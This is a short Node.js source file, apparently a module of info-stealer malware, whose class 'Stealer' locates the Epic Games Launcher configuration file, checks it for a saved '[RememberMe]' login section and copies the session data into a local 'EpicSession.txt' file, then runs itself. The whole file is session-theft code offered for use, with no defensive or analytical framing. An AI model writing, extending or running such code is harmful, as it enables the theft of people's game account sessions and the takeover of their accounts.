const fs = require('fs');
const path = require('path');

class Stealer {
  async stealEpic() {
    if (Settings.CaptureGames) {
      console.log("Stealing Epic session");
      const scriptDir = path.dirname(__filename);
      console.log(`scriptDir: ${scriptDir}`);
      const saveToPath = path.join(scriptDir, "modules");
      console.log(`saveToPath: ${saveToPath}`);
      const epicPath = path.join(process.env.LOCALAPPDATA, "EpicGamesLauncher", "Saved", "Config", "Windows");
      console.log(`epicPath: ${epicPath}`);
      const loginFile = path.join(epicPath, "GameUserSettings.ini");
      console.log(`loginFile: ${loginFile}`);

      try {
        if (!fs.existsSync(epicPath)) {
          console.error(`Epic path does not exist: ${epicPath}`);
          return;
        }

        if (!fs.existsSync(loginFile)) {
          console.error(`Login file does not exist: ${loginFile}`);
          return;
        }

        const contents = await fs.promises.readFile(loginFile, 'utf8');
        console.log(`loginFile contents: ${contents}`);

        if (!contents.includes("[RememberMe]")) {
          console.error("Login file does not contain [RememberMe] section");
          return;
        }

        try {
          await fs.promises.mkdir(saveToPath, { recursive: true });
          const sessionFile = path.join(saveToPath, "EpicSession.txt");
          await fs.promises.writeFile(sessionFile, contents);
          console.log(`Epic session saved to ${sessionFile}`);
        } catch (err) {
          console.error(`Error writing to file: ${err.message}`);
          console.error(err.stack);
        }
      } catch (err) {
        console.error(`Error reading file: ${err.message}`);
        console.error(err.stack);
      }
    } else {
      console.log("Settings.CaptureGames is false, skipping the stealEpic function.");
    }
  }
}

const Settings = { CaptureGames: true };

const stealer = new Stealer();
stealer.stealEpic();
